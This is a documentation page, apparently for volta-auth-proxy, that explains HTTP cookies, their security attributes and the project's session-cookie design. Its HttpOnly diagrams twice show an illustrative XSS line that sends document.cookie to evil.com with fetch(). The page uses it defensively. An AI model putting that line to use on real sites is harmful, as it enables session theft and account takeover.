# Cookie

[日本語版はこちら](cookie.ja.md)

---

## What is it?

A cookie is a small piece of data that a website asks your browser to store. Every time you make a request to that website, the browser automatically sends the cookie back. Cookies are the foundation of how websites "remember" you between page loads -- because HTTP itself is stateless (each request is independent, with no memory of previous ones).

Think of it like a hand stamp at a club. When you enter, you get a stamp. Every time you come back from the bathroom or the bar, the bouncer sees the stamp and lets you back in without checking your ID again. The stamp is the cookie.

---

## Why does it matter?

Without cookies, every time you click a link on a website, the server would have no idea who you are. You would have to log in on every single page. Shopping carts would empty themselves. User preferences would reset constantly.

Cookies are also a major security surface. If an attacker steals your cookie, they become you. If cookies are misconfigured, they can be intercepted, stolen by JavaScript, or sent to the wrong sites. Getting cookie settings right is critical for authentication security.

---

## How does it work?

### Setting a cookie

When a server wants to set a cookie, it includes a `Set-Cookie` header in the response:

```
  HTTP/1.1 200 OK
  Set-Cookie: __volta_session=550e8400-e29b-41d4-a716-446655440000;
              Path=/;
              HttpOnly;
              Secure;
              SameSite=Lax;
              Max-Age=28800
```

The browser stores this and sends it back on every subsequent request to that domain:

```
  GET /dashboard HTTP/1.1
  Host: volta.example.com
  Cookie: __volta_session=550e8400-e29b-41d4-a716-446655440000
```

### Cookie attributes explained

| Attribute | What it does | Example | Why it matters |
|-----------|-------------|---------|----------------|
| **HttpOnly** | JavaScript cannot read this cookie | `HttpOnly` | Prevents XSS attacks from stealing your session. `document.cookie` will not show it. |
| **Secure** | Cookie is only sent over HTTPS | `Secure` | Prevents an attacker on the network from intercepting the cookie over plain HTTP. |
| **SameSite** | Controls when cookie is sent cross-origin | `SameSite=Lax` | Prevents CSRF attacks. See [csrf.md](csrf.md). |
| **Path** | Cookie is only sent for requests to this path | `Path=/` | Limits which URLs receive the cookie. `/` means all paths. |
| **Domain** | Which domains receive the cookie | `Domain=.example.com` | Controls cookie scope. If omitted, only the exact domain matches. |
| **Max-Age** | How long until the cookie expires (seconds) | `Max-Age=28800` | 28800 = 8 hours. After that, the browser deletes it. |
| **Expires** | Absolute expiration date | `Expires=Thu, 01 Jan 2026...` | Alternative to Max-Age. Max-Age takes precedence if both are set. |

### HttpOnly in depth

```
  Without HttpOnly:
  ┌─────────────────────────────────────────┐
  │  Browser                                │
  │                                         │
  │  Cookie: session=abc123                 │
  │      ↑                                  │
  │      ├── Server can read it  ✓          │
  │      └── JavaScript can read it  ✓      │
  │          document.cookie → "session=abc" │
  │                                         │
  │  XSS attack script:                     │
  │  fetch("https://evil.com/?c=" +         │
  │        document.cookie)                 │
  │  → Session stolen!                      │
  └─────────────────────────────────────────┘

  With HttpOnly:
  ┌─────────────────────────────────────────┐
  │  Browser                                │
  │                                         │
  │  Cookie: session=abc123 (HttpOnly)      │
  │      ↑                                  │
  │      ├── Server can read it  ✓          │
  │      └── JavaScript can read it  ✗      │
  │          document.cookie → ""           │
  │                                         │
  │  XSS attack script:                     │
  │  fetch("https://evil.com/?c=" +         │
  │        document.cookie)                 │
  │  → Empty string. Session safe.          │
  └─────────────────────────────────────────┘
```

### SameSite in depth

See [csrf.md](csrf.md) for a full explanation. In summary:

- **`Lax`** (volta's choice): Cookies are sent on top-level navigations (clicking links) but not on cross-origin POST/iframe/AJAX. This stops most CSRF attacks while still allowing normal link navigation.
- **`Strict`**: Cookies are never sent cross-origin. Most secure, but breaks "click this link in the email to see your dashboard" flows.
- **`None`**: Cookies always sent (old behavior). Only use with `Secure`.

---

## How does volta-auth-proxy use cookies?

volta uses exactly one cookie for authentication: `__volta_session`.

```
  Name:     __volta_session
  Value:    UUID (session ID, e.g. 550e8400-e29b-41d4-a716-446655440000)
  HttpOnly: Yes (JavaScript cannot read it)
  Secure:   Yes (HTTPS only in production)
  SameSite: Lax (blocks cross-origin POST)
  Path:     /
  Max-Age:  28800 (8 hours, sliding window)
```

### What the cookie stores

The cookie itself only contains a session ID (a UUID). It does NOT contain user data, roles, tenant information, or anything else. All session data lives in the PostgreSQL `sessions` table:

```
  Browser cookie:              Server (sessions table):
  ┌────────────────────┐       ┌─────────────────────────────┐
  │ 550e8400-e29b-...  │ ───── │ id: 550e8400-e29b-...       │
  └────────────────────┘       │ user_id: user-uuid           │
                               │ tenant_id: tenant-uuid       │
    Just a key.                │ expires_at: 2026-03-31T17:00 │
    No data.                   │ ip_address: 192.168.1.1      │
    Not useful without         │ user_agent: Chrome/...       │
    the server.                │ csrf_token: Kj8mX2pQ...     │
                               └─────────────────────────────┘
```

This design means:

1. **If the cookie is stolen, the attacker gets a session ID** -- not the user's data. The server can revoke the session.
2. **The cookie is small** -- just a UUID, well under the 4KB cookie size limit.
3. **Session data can be updated without changing the cookie** -- e.g., extending the expiry.

### Why not a JWT cookie?

Some systems store the entire JWT in a cookie. volta does not, because:

- JWTs are larger (500+ bytes) and approach cookie size limits when claims grow.
- JWTs cannot be revoked. If you store a JWT in a cookie, you cannot log the user out server-side until it expires.
- Session cookies can be invalidated instantly by deleting the session from the database.
- volta uses JWTs for a different purpose: short-lived tokens passed to apps via headers or API calls.

---

## Common mistakes and attacks

### Mistake 1: Forgetting HttpOnly

If session cookies are not HttpOnly, any XSS vulnerability in your app lets the attacker steal sessions. This is one of the most common web vulnerabilities.

### Mistake 2: Not setting Secure in production

Without `Secure`, the cookie can be sent over HTTP (not HTTPS). Anyone on the same network (coffee shop WiFi) can intercept it.

### Mistake 3: Overly broad Domain

Setting `Domain=.example.com` means the cookie is sent to `evil.example.com` too. Be specific.

### Mistake 4: Not setting an expiry

A cookie without `Max-Age` or `Expires` is a "session cookie" -- it disappears when the browser closes. This sounds secure, but modern browsers often restore session cookies on restart. Set an explicit expiry.

### Attack: Cookie theft via XSS

Even with HttpOnly, an XSS vulnerability can still use the cookie (by making requests from the page), but cannot exfiltrate it. HttpOnly reduces the attack surface but does not eliminate XSS risk entirely.

---

## Further reading

- [MDN: HTTP Cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies) -- Comprehensive reference.
- [session.md](session.md) -- How volta uses sessions with cookies.
- [csrf.md](csrf.md) -- How SameSite cookies prevent CSRF.
- [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html) -- Security best practices.
